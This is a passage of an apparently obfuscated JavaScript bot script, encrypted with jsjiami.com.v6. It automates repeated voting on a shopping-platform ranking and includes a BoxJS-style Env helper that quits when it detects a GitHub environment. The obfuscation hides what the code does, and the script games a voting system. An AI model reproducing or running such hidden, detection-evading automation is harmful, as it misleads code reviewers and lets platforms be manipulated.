_0x2babf7='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x10e555['atob']||(_0x10e555['atob']=function(_0x37cc3a){var _0x3f63f3=String(_0x37cc3a)['replace'](/=+$/,'');for(var _0x5c7d26=0x0,_0x3f716e,_0x458d40,_0x35242c=0x0,_0x1806f7='';_0x458d40=_0x3f63f3['charAt'](_0x35242c++);~_0x458d40&&(_0x3f716e=_0x5c7d26%0x4?_0x3f716e*0x40+_0x458d40:_0x458d40,_0x5c7d26++%0x4)?_0x1806f7+=String['fromCharCode'](0xff&_0x3f716e>>(-0x2*_0x5c7d26&0x6)):0x0){_0x458d40=_0x2babf7['indexOf'](_0x458d40);}return _0x1806f7;});}());var _0xcb1828=function(_0x3d11e2,_0xa52f8c){var _0x5703c6=[],_0x289b63=0x0,_0x4826e9,_0x30925b='',_0x2df494='';_0x3d11e2=atob(_0x3d11e2);for(var _0x22a65a=0x0,_0x5f4b24=_0x3d11e2['length'];_0x22a65a<_0x5f4b24;_0x22a65a++){_0x2df494+='%'+('00'+_0x3d11e2['charCodeAt'](_0x22a65a)['toString'](0x10))['slice'](-0x2);}_0x3d11e2=decodeURIComponent(_0x2df494);for(var _0x20502f=0x0;_0x20502f<0x100;_0x20502f++){_0x5703c6[_0x20502f]=_0x20502f;}for(_0x20502f=0x0;_0x20502f<0x100;_0x20502f++){_0x289b63=(_0x289b63+_0x5703c6[_0x20502f]+_0xa52f8c['charCodeAt'](_0x20502f%_0xa52f8c['length']))%0x100;_0x4826e9=_0x5703c6[_0x20502f];_0x5703c6[_0x20502f]=_0x5703c6[_0x289b63];_0x5703c6[_0x289b63]=_0x4826e9;}_0x20502f=0x0;_0x289b63=0x0;for(var _0x2eac5c=0x0;_0x2eac5c<_0x3d11e2['length'];_0x2eac5c++){_0x20502f=(_0x20502f+0x1)%0x100;_0x289b63=(_0x289b63+_0x5703c6[_0x20502f])%0x100;_0x4826e9=_0x5703c6[_0x20502f];_0x5703c6[_0x20502f]=_0x5703c6[_0x289b63];_0x5703c6[_0x289b63]=_0x4826e9;_0x30925b+=String['fromCharCode'](_0x3d11e2['charCodeAt'](_0x2eac5c)^_0x5703c6[(_0x5703c6[_0x20502f]+_0x5703c6[_0x289b63])%0x100]);}return _0x30925b;};_0x4516['DFSRBh']=_0xcb1828;_0x4516['JiinJB']={};_0x4516['ibAilS']=!![];}var _0x3fb1ae=_0x4516['JiinJB'][_0x409987];if(_0x3fb1ae===undefined){if(_0x4516['yConHD']===undefined){_0x4516['yConHD']=!![];}_0x393d76=_0x4516['DFSRBh'](_0x393d76,_0xa52f8c);_0x4516['JiinJB'][_0x409987]=_0x393d76;}else{_0x393d76=_0x3fb1ae;}return _0x393d76;};async function rankVote(){var _0x14992d={'LVtvN':function(_0x29aebd,_0xf97453){return _0x29aebd!==_0xf97453;},'IsBsc':function(_0x3f5b81){return _0x3f5b81();},'hFdDe':function(_0x3696a1){return _0x3696a1();},'xDtSo':function(_0x10c757,_0x2af0e6){return _0x10c757>_0x2af0e6;},'lLSUg':function(_0x5d72d8,_0x4dc62d){return _0x5d72d8<=_0x4dc62d;},'mWleA':function(_0x36f76f,_0x1ce027){return _0x36f76f(_0x1ce027);},'SKkMg':function(_0xc90b65,_0x5be4d0){return _0xc90b65<_0x5be4d0;},'TArro':_0x4516('0','39MY'),'SqhLq':function(_0x3275ba,_0x297d61,_0x39e9b0){return _0x3275ba(_0x297d61,_0x39e9b0);}};$[_0x4516('1','tyEF')]=0x0;$[_0x4516('2','2300')]=0x0;$[_0x4516('3','[k^k')]='48';if(_0x14992d[_0x4516('4','G30u')](new Date()[_0x4516('5','tyEF')](),0x1c))return;await _0x14992d[_0x4516('6','Q8^E')](smtg_rankPage);if($[_0x4516('7','[k^k')]){await _0x14992d[_0x4516('8','APt$')](smtg_rankList);}if(_0x14992d[_0x4516('9','hK0w')]($[_0x4516('a','vL7x')],0x276161)||_0x14992d[_0x4516('b','K]c1')]($[_0x4516('c','HU]&')],0x0))return;if($[_0x4516('d','n#m]')]){await _0x14992d[_0x4516('e','2300')](smtg_rankList,{'rankListId':$[_0x4516('f','73HF')],'channel':0x1});if($[_0x4516('10','8[$0')]){for(let _0x4b84ce=0x0;_0x14992d[_0x4516('11','7cj(')](_0x4b84ce,new Array($[_0x4516('12','IHkb')])[_0x4516('13','Cvu!')]('')[_0x4516('14','7cj(')]);_0x4b84ce++){if(_0x14992d[_0x4516('15','^TrI')](_0x14992d[_0x4516('16','kaV^')],_0x14992d[_0x4516('17','n#m]')])){$[_0x4516('18','QwYH')](e,resp);}else{await _0x14992d[_0x4516('19','Q8^E')](smtg_rankVote,$[_0x4516('1a','&@NO')],$[_0x4516('1b','QwYH')]);await $[_0x4516('1c','L[ef')](0x1f4);}}}}}function smtg_rankPage(){var _0x851dbb={'JOqXn':function(_0x29d6e5,_0x214e49){return _0x29d6e5(_0x214e49);},'mMDAC':function(_0x99bba3,_0x5d86dd){return _0x99bba3===_0x5d86dd;},'tYAXc':_0x4516('1d','HfVg'),'QXKpu':_0x4516('1e','Snh9'),'xWxKw':function(_0x1d2e69,_0x1080bc){return _0x1d2e69===_0x1080bc;},'XdwCs':_0x4516('1f','c]YT'),'LSqoH':function(_0xaf110d,_0x384539){return _0xaf110d===_0x384539;},'fuKhf':_0x4516('20','^TrI'),'qdXoo':_0x4516('21','Q8^E'),'cFXLu':_0x4516('22','APt$'),'RCqsx':_0x4516('23','73HF'),'YzUiC':_0x4516('24','Q8^E'),'dKQsU':_0x4516('25','Snh9'),'MZNHJ':_0x4516('26','Snh9'),'vnvNr':_0x4516('27','t9Ri'),'hGQDx':function(_0x5692fe,_0x25ba83){return _0x5692fe(_0x25ba83);},'hCQat':function(_0xf4235,_0x430537){return _0xf4235===_0x430537;},'VUhIU':_0x4516('28','7&O%'),'fQsBJ':function(_0x483042,_0x5ed3bd,_0x4d2518){return _0x483042(_0x5ed3bd,_0x4d2518);},'NGcvP':_0x4516('29','1u&]')};return new Promise(async _0x39a628=>{var _0x58a332={'WxhkA':function(_0x3b7bdd,_0x6fe55c){return _0x851dbb[_0x4516('2a','dE6*')](_0x3b7bdd,_0x6fe55c);},'zaMEp':_0x851dbb[_0x4516('2b','IHkb')],'XCZeQ':_0x851dbb[_0x4516('2c','1u&]')],'PyswT':_0x851dbb[_0x4516('2d','Ue)B')],'TIXfv':_0x851dbb[_0x4516('2e','G&Pt')],'vpTvf':_0x851dbb[_0x4516('2f','Q8^E')],'GlFoV':_0x851dbb[_0x4516('30','&@NO')]};$[_0x4516('31','Iair')](_0x851dbb[_0x4516('32','Snh9')](taskUrl,_0x851dbb[_0x4516('33','KmHg')],{'channel':0x1}),(_0xaa4e75,_0x145dc8,_0x1f3692)=>{var _0x538544={'aIofz':function(_0x5d53c7,_0x4248a5){return _0x851dbb[_0x4516('34','tyEF')](_0x5d53c7,_0x4248a5);}};if(_0x851dbb[_0x4516('35','l!@g')](_0x851dbb[_0x4516('36','SaW@')],_0x851dbb[_0x4516('37','8[$0')])){try{if(_0xaa4e75){}else{if(_0x851dbb[_0x4516('38','QwYH')](_0x851dbb[_0x4516('39','mH)O')],_0x851dbb[_0x4516('3a','APt$')])){_0x1f3692=JSON[_0x4516('3b','L[ef')](_0x1f3692);if(_0x851dbb[_0x4516('3c','dE6*')](_0x1f3692[_0x851dbb[_0x4516('3d','hK0w')]],0x0)){if(_0x851dbb[_0x4516('3e','IuCM')](_0x1f3692[_0x851dbb[_0x4516('3f','@P9V')]][_0x851dbb[_0x4516('40','7&O%')]],0x0)){if(_0x851dbb[_0x4516('41','73HF')](_0x851dbb[_0x4516('42','KmHg')],_0x851dbb[_0x4516('43','dE6*')])){_0x538544[_0x4516('44','&@NO')](_0x39a628,_0x1f3692);}else{const {result}=_0x1f3692[_0x851dbb[_0x4516('45','mH)O')]];$[_0x4516('46','Snh9')]=result[_0x851dbb[_0x4516('47','d14o')]];$[_0x4516('48','Iair')]=result[_0x851dbb[_0x4516('49','SaW@')]];$[_0x4516('4a','vL7x')]=result[_0x851dbb[_0x4516('4b','Cvu!')]];}}}}else{if(_0x58a332[_0x4516('4c','39MY')](_0x1f3692[_0x58a332[_0x4516('4d','l!@g')]][_0x58a332[_0x4516('4e','8[$0')]],0x0)){const {result}=_0x1f3692[_0x58a332[_0x4516('4f','tyEF')]];const _0x33963b=result[_0x58a332[_0x4516('50','APt$')]];}}}}catch(_0x2db34f){$[_0x4516('51','bzjJ')](_0x2db34f,_0x145dc8);}finally{if(_0x851dbb[_0x4516('52','ZQoj')](_0x851dbb[_0x4516('53','f5WP')],_0x851dbb[_0x4516('54','RFUT')])){_0x851dbb[_0x4516('55','Snh9')](_0x39a628,_0x1f3692);}else{$[_0x4516('56','tyEF')](e,_0x145dc8);}}}else{const {result}=_0x1f3692[_0x58a332[_0x4516('57','7cj(')]];$[_0x4516('58','IuCM')]=result[_0x58a332[_0x4516('59','Q8^E')]];$[_0x4516('5a','2300')]=result[_0x58a332[_0x4516('5b','1u&]')]];$[_0x4516('5c','Iair')]=result[_0x58a332[_0x4516('5d','7&O%')]];}});});}function smtg_rankList(_0x1fca5e={'rankListId':$[_0x4516('5e','mH)O')],'channel':0x1}){var _0x3fa928={'LWIMr':function(_0x182159,_0x6ff963){return _0x182159===_0x6ff963;},'hogoS':_0x4516('5f','ZQoj'),'smtwU':_0x4516('60','e$ny'),'eGKcc':_0x4516('61','kaV^'),'ZiYOY':_0x4516('62','QwYH'),'WVsOX':_0x4516('63','l8Q&'),'IIoaU':function(_0x5b44b1,_0x212d91){return _0x5b44b1(_0x212d91);},'FeIgu':_0x4516('64','ZQoj'),'sNaiW':_0x4516('65','IHkb'),'UkCgW':_0x4516('66','39MY'),'HryGI':_0x4516('67','d14o'),'TDvjo':function(_0x2641c2,_0x5ca9a8){return _0x2641c2!==_0x5ca9a8;},'lAvpN':_0x4516('68','1u&]'),'JbamU':_0x4516('69','IHkb'),'Nkwjo':function(_0x351f34,_0x1ca057){return _0x351f34===_0x1ca057;},'pGCQN':function(_0x50e6e3,_0x552653){return _0x50e6e3!==_0x552653;},'QWbfJ':_0x4516('6a','HfVg'),'kOBkS':_0x4516('6b','[k^k'),'nzakr':_0x4516('6c','t9Ri'),'ibugd':function(_0x1ec2a3,_0x385913){return _0x1ec2a3===_0x385913;},'zAlFm':_0x4516('6d','HfVg'),'SuAxU':_0x4516('6e','KmHg'),'jbRZy':function(_0xffd194,_0x39b800){return _0xffd194===_0x39b800;},'CdSaG':_0x4516('6f','e$ny'),'uOClN':function(_0x3e2eb0,_0x64490a,_0x1db500){return _0x3e2eb0(_0x64490a,_0x1db500);},'mDdiJ':_0x4516('70','e$ny')};return new Promise(async _0x3b201a=>{var _0x6327f1={'vNVip':_0x3fa928[_0x4516('71','bzjJ')],'hVSSG':function(_0x1e831b,_0x10b5d4){return _0x3fa928[_0x4516('72','tyEF')](_0x1e831b,_0x10b5d4);}};$[_0x4516('73','G&Pt')](_0x3fa928[_0x4516('74','W5n@')](taskUrl,_0x3fa928[_0x4516('75','IuCM')],_0x1fca5e),(_0x49521f,_0x2d0fa8,_0x206490)=>{var _0x5c2bd6={'tULtG':function(_0x377461,_0x3eaf61){return _0x3fa928[_0x4516('76','d14o')](_0x377461,_0x3eaf61);},'HyFBO':_0x3fa928[_0x4516('77','l8Q&')],'wzPae':_0x3fa928[_0x4516('78','L[ef')],'ftAVZ':_0x3fa928[_0x4516('79','L[ef')],'HeTwu':_0x3fa928[_0x4516('7a','mH)O')],'XNyIa':_0x3fa928[_0x4516('7b','l8Q&')],'IvhaL':function(_0x3e8866,_0x362f29){return _0x3fa928[_0x4516('7c','c]YT')](_0x3e8866,_0x362f29);},'zvrep':function(_0x4105c6,_0x420e6f){return _0x3fa928[_0x4516('7d','7cj(')](_0x4105c6,_0x420e6f);},'tCWfU':_0x3fa928[_0x4516('7e','hK0w')],'nmCAo':_0x3fa928[_0x4516('7f','t9Ri')],'kDbsV':_0x3fa928[_0x4516('80','RFUT')],'pTkNC':_0x3fa928[_0x4516('81','Iair')]};if(_0x3fa928[_0x4516('82','Cvu!')](_0x3fa928[_0x4516('83','l8Q&')],_0x3fa928[_0x4516('84','RFUT')])){try{if(_0x49521f){}else{_0x206490=JSON[_0x4516('85','8[$0')](_0x206490);if(_0x3fa928[_0x4516('86','tyEF')](_0x206490[_0x3fa928[_0x4516('87','HfVg')]],0x0)){if(_0x3fa928[_0x4516('88','W5n@')](_0x206490[_0x3fa928[_0x4516('77','l8Q&')]][_0x3fa928[_0x4516('89','vL7x')]],0x0)){if(_0x3fa928[_0x4516('8a','7cj(')](_0x3fa928[_0x4516('8b','HU]&')],_0x3fa928[_0x4516('8c','^637')])){const {result}=_0x206490[_0x3fa928[_0x4516('8d','7&O%')]];$[_0x4516('8e','73HF')]=result[_0x3fa928[_0x4516('8f','QwYH')]];if(result[_0x3fa928[_0x4516('7a','mH)O')]]&&result[_0x3fa928[_0x4516('90','APt$')]][_0x4516('91','@P9V')]){if(_0x3fa928[_0x4516('92','Cvu!')](_0x3fa928[_0x4516('93','f5WP')],_0x3fa928[_0x4516('94','Iair')])){if(_0x5c2bd6[_0x4516('95','^637')](_0x206490[_0x5c2bd6[_0x4516('96','RFUT')]][_0x5c2bd6[_0x4516('97','G30u')]],0x0)){const {result}=_0x206490[_0x5c2bd6[_0x4516('98','^637')]];$[_0x4516('99','SaW@')]=result[_0x5c2bd6[_0x4516('9a','1u&]')]];if(result[_0x5c2bd6[_0x4516('9b','z*gD')]]&&result[_0x5c2bd6[_0x4516('9c','vL7x')]][_0x4516('9d','Iair')]){const _0x3c0512=result[_0x5c2bd6[_0x4516('9e','KmHg')]][_0x4516('9f','vL7x')](_0x41dd61=>!!_0x41dd61&&_0x41dd61['id']===$[_0x4516('a0','L[ef')]);if(_0x3c0512&&_0x3c0512[_0x4516('a1','^TrI')]){$[_0x4516('a2','L[ef')]=_0x3c0512[0x0][_0x5c2bd6[_0x4516('a3','KmHg')]];}}}}else{const _0x381b37=result[_0x3fa928[_0x4516('a4','@P9V')]][_0x4516('a5','dE6*')](_0x801acd=>!!_0x801acd&&_0x801acd['id']===$[_0x4516('a6','l!@g')]);if(_0x381b37&&_0x381b37[_0x4516('a7','dE6*')]){if(_0x3fa928[_0x4516('a8','HfVg')](_0x3fa928[_0x4516('a9','G&Pt')],_0x3fa928[_0x4516('aa','&@NO')])){$[_0x4516('ab','&@NO')]=_0x381b37[0x0][_0x6327f1[_0x4516('ac','dE6*')]];}else{$[_0x4516('ad','RFUT')]=_0x381b37[0x0][_0x3fa928[_0x4516('ae','Iair')]];}}}}}else{_0x6327f1[_0x4516('af','^]ML')](_0x3b201a,_0x206490);}}}}}catch(_0x457ed2){if(_0x3fa928[_0x4516('b0','IHkb')](_0x3fa928[_0x4516('b1','vL7x')],_0x3fa928[_0x4516('b2','HfVg')])){$[_0x4516('b3','l!@g')](_0x457ed2,_0x2d0fa8);}else{_0x5c2bd6[_0x4516('b4','Iair')](_0x3b201a,_0x206490);}}finally{_0x3fa928[_0x4516('b5','IHkb')](_0x3b201a,_0x206490);}}else{_0x206490=JSON[_0x4516('b6','c]YT')](_0x206490);if(_0x5c2bd6[_0x4516('b7','L[ef')](_0x206490[_0x5c2bd6[_0x4516('b8','Snh9')]],0x0)){if(_0x5c2bd6[_0x4516('b9','SaW@')](_0x206490[_0x5c2bd6[_0x4516('ba','KmHg')]][_0x5c2bd6[_0x4516('bb','tyEF')]],0x0)){const {result}=_0x206490[_0x5c2bd6[_0x4516('bc','IHkb')]];$[_0x4516('bd','d14o')]=result[_0x5c2bd6[_0x4516('be','Iair')]];$[_0x4516('66','39MY')]=result[_0x5c2bd6[_0x4516('bf','KmHg')]];$[_0x4516('c0','8[$0')]=result[_0x5c2bd6[_0x4516('c1','Snh9')]];}}}});});}function smtg_rankVote(_0x2f6da8,_0x4897b7,_0x4f7084=$[_0x4516('c2','73HF')]){var _0x2251d6={'BCXaq':_0x4516('c3','n#m]'),'fJRgK':_0x4516('c4','d14o'),'OhJeP':function(_0x4cb488,_0x189ade){return _0x4cb488===_0x189ade;},'sULDI':_0x4516('c5','HU]&'),'TSXWs':function(_0x1daa66,_0x21ae6b){return _0x1daa66===_0x21ae6b;},'gUJHO':_0x4516('c6','hK0w'),'leaOr':_0x4516('c7','KmHg'),'GiVaF':_0x4516('c8','f5WP'),'gvSUX':_0x4516('c9','Ue)B'),'ripaC':_0x4516('ca','c]YT'),'QxNZc':_0x4516('cb','f5WP'),'YJMDz':_0x4516('cc','t9Ri'),'bPerk':function(_0xff107,_0x4f73b8){return _0xff107!==_0x4f73b8;},'CTxJO':_0x4516('cd','SaW@'),'tgDsz':function(_0x435fbe,_0x2ba59f){return _0x435fbe!==_0x2ba59f;},'ITLLE':_0x4516('ce','Iair'),'wBZZd':_0x4516('cf','IHkb'),'WgoOi':_0x4516('d0','7cj('),'NRTQj':function(_0x511b27,_0x6a1711){return _0x511b27===_0x6a1711;},'BcbTv':_0x4516('d1','Q8^E'),'HTddH':_0x4516('d2','7&O%'),'cvOMZ':_0x4516('d3','73HF'),'gkPUn':function(_0x4f3a11,_0x4506af){return _0x4f3a11(_0x4506af);},'DyEHB':_0x4516('d4','RFUT'),'dFHRk':_0x4516('d5','[k^k'),'osFzF':function(_0x8e27af,_0x47138e,_0x453612){return _0x8e27af(_0x47138e,_0x453612);},'niVMI':_0x4516('d6','L[ef')};return new Promise(async _0x1f3eca=>{var _0x4f2235={'gyAXB':_0x2251d6[_0x4516('d7','tyEF')],'OrvIh':_0x2251d6[_0x4516('d8','7cj(')],'crFVb':function(_0x15f8fc,_0xbdbaf){return _0x2251d6[_0x4516('d9','G&Pt')](_0x15f8fc,_0xbdbaf);},'dVsMt':_0x2251d6[_0x4516('da','HU]&')],'CMLjg':function(_0x1b2b8c,_0x56be5d){return _0x2251d6[_0x4516('db','HU]&')](_0x1b2b8c,_0x56be5d);},'fEjYN':_0x2251d6[_0x4516('dc','73HF')],'mjXuR':_0x2251d6[_0x4516('dd','[k^k')],'ExWgT':_0x2251d6[_0x4516('de','bzjJ')],'HoNMc':_0x2251d6[_0x4516('df','l8Q&')],'ikDSY':_0x2251d6[_0x4516('e0','z*gD')],'ZtDrd':_0x2251d6[_0x4516('e1','kaV^')],'IiaDa':_0x2251d6[_0x4516('e2','Q8^E')],'ESOKr':function(_0xa441,_0x2eb05c){return _0x2251d6[_0x4516('e3','G30u')](_0xa441,_0x2eb05c);},'wfVhJ':_0x2251d6[_0x4516('e4','l!@g')],'uzCnC':function(_0x9b8671,_0x47aa85){return _0x2251d6[_0x4516('e5','KmHg')](_0x9b8671,_0x47aa85);},'XBrVd':_0x2251d6[_0x4516('e6','@P9V')],'JWiKD':_0x2251d6[_0x4516('e7','dE6*')],'etCOG':_0x2251d6[_0x4516('e8','^TrI')],'wYzlU':function(_0x5a3b7e,_0xfb2dd6){return _0x2251d6[_0x4516('e9','Ue)B')](_0x5a3b7e,_0xfb2dd6);},'UjTSL':function(_0x13914f,_0x1400f0){return _0x2251d6[_0x4516('ea','e$ny')](_0x13914f,_0x1400f0);},'KtNrP':function(_0x1d352d,_0x5a6c79){return _0x2251d6[_0x4516('eb','Q8^E')](_0x1d352d,_0x5a6c79);},'zLIPt':_0x2251d6[_0x4516('ec','7cj(')],'rUoDd':function(_0x4426a0,_0x2ca70f){return _0x2251d6[_0x4516('ed','t9Ri')](_0x4426a0,_0x2ca70f);},'BftJd':_0x2251d6[_0x4516('ee','RFUT')],'fiPSo':_0x2251d6[_0x4516('ef','hK0w')],'InKoW':function(_0x638313,_0x26828c){return _0x2251d6[_0x4516('f0','d14o')](_0x638313,_0x26828c);}};if(_0x2251d6[_0x4516('f1','c]YT')](_0x2251d6[_0x4516('f2','2300')],_0x2251d6[_0x4516('f3','^TrI')])){$[_0x4516('f4','Ue)B')](_0x2251d6[_0x4516('f5','W&N5')](taskUrl,_0x2251d6[_0x4516('f6','1u&]')],{'playerId':_0x4f7084,'periodId':_0x2f6da8,'rankListId':_0x4897b7,'channel':0x1}),async(_0x35b987,_0x5be8db,_0x50c59f)=>{var _0x2c2358={'azRsK':_0x4f2235[_0x4516('f7','W&N5')],'RekII':_0x4f2235[_0x4516('f8','QwYH')],'kUkFr':_0x4f2235[_0x4516('f9','2300')],'jZqLo':_0x4f2235[_0x4516('fa','G&Pt')],'DOYZV':_0x4f2235[_0x4516('fb','tyEF')],'OGKry':function(_0xb1ddf3,_0x39e94e){return _0x4f2235[_0x4516('fc','RFUT')](_0xb1ddf3,_0x39e94e);},'IPvBS':_0x4f2235[_0x4516('fd','^637')],'gdwOg':_0x4f2235[_0x4516('fe','tyEF')],'ywKAm':_0x4f2235[_0x4516('ff','[k^k')],'bXHMq':_0x4f2235[_0x4516('100','IuCM')]};if(_0x4f2235[_0x4516('101','2300')](_0x4f2235[_0x4516('102','&@NO')],_0x4f2235[_0x4516('103','vL7x')])){const _0x1dd629=result[_0x4f2235[_0x4516('104','hK0w')]][_0x4516('105','kaV^')](_0x1c3b52=>!!_0x1c3b52&&_0x1c3b52['id']===$[_0x4516('106','HfVg')]);if(_0x1dd629&&_0x1dd629[_0x4516('107','Cvu!')]){$[_0x4516('108','^TrI')]=_0x1dd629[0x0][_0x4f2235[_0x4516('109','7cj(')]];}}else{try{if(_0x4f2235[_0x4516('10a','e$ny')](_0x4f2235[_0x4516('10b','7cj(')],_0x4f2235[_0x4516('10c','vL7x')])){const {result}=_0x50c59f[_0x2c2358[_0x4516('10d','c]YT')]];$[_0x4516('c9','Ue)B')]=result[_0x2c2358[_0x4516('10e','73HF')]];if(result[_0x2c2358[_0x4516('10f','IHkb')]]&&result[_0x2c2358[_0x4516('110','hK0w')]][_0x4516('111','^]ML')]){const _0x456776=result[_0x2c2358[_0x4516('112','&@NO')]][_0x4516('113','K]c1')](_0x4a51ad=>!!_0x4a51ad&&_0x4a51ad['id']===$[_0x4516('114','ZQoj')]);if(_0x456776&&_0x456776[_0x4516('a7','dE6*')]){$[_0x4516('115','QwYH')]=_0x456776[0x0][_0x2c2358[_0x4516('116','^TrI')]];}}}else{if(_0x35b987){}else{if(_0x4f2235[_0x4516('117','KmHg')](_0x4f2235[_0x4516('118','7cj(')],_0x4f2235[_0x4516('119','8[$0')])){const {result}=_0x50c59f[_0x2c2358[_0x4516('11a','W&N5')]];const _0x121ece=result[_0x2c2358[_0x4516('11b','d14o')]];}else{_0x50c59f=JSON[_0x4516('11c','f5WP')](_0x50c59f);if(_0x4f2235[_0x4516('11d','mH)O')](_0x50c59f[_0x4f2235[_0x4516('11e','39MY')]],0x0)){if(_0x4f2235[_0x4516('11f','K]c1')](_0x50c59f[_0x4f2235[_0x4516('120','l!@g')]][_0x4f2235[_0x4516('121','hK0w')]],0x0)){if(_0x4f2235[_0x4516('122','vL7x')](_0x4f2235[_0x4516('123','^TrI')],_0x4f2235[_0x4516('124','hK0w')])){const {result}=_0x50c59f[_0x4f2235[_0x4516('125','73HF')]];const _0x5b3a5d=result[_0x4f2235[_0x4516('126','mH)O')]];}else{_0x50c59f=JSON[_0x4516('127','Iair')](_0x50c59f);if(_0x4f2235[_0x4516('128','Ue)B')](_0x50c59f[_0x4f2235[_0x4516('129','c]YT')]],0x0)){if(_0x4f2235[_0x4516('12a','[k^k')](_0x50c59f[_0x4f2235[_0x4516('12b','QwYH')]][_0x4f2235[_0x4516('12c','e$ny')]],0x0)){const {result}=_0x50c59f[_0x4f2235[_0x4516('12d','Iair')]];const _0x15f5a2=result[_0x4f2235[_0x4516('12e','Cvu!')]];}}}}}}}}}catch(_0x2263f3){$[_0x4516('12f','IHkb')](_0x2263f3,_0x5be8db);}finally{if(_0x4f2235[_0x4516('130','IuCM')](_0x4f2235[_0x4516('131','APt$')],_0x4f2235[_0x4516('132','&@NO')])){if(_0x2c2358[_0x4516('133','73HF')](_0x50c59f[_0x2c2358[_0x4516('134','IuCM')]][_0x2c2358[_0x4516('135','Q8^E')]],0x0)){const {result}=_0x50c59f[_0x2c2358[_0x4516('136','HfVg')]];$[_0x4516('137','ZQoj')]=result[_0x2c2358[_0x4516('138','APt$')]];$[_0x4516('139','l!@g')]=result[_0x2c2358[_0x4516('13a','Iair')]];$[_0x4516('13b','hK0w')]=result[_0x2c2358[_0x4516('13c','^637')]];}}else{_0x4f2235[_0x4516('13d','W&N5')](_0x1f3eca,_0x50c59f);}}}});}else{$[_0x4516('b3','l!@g')](e,resp);}});};_0xod2='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const 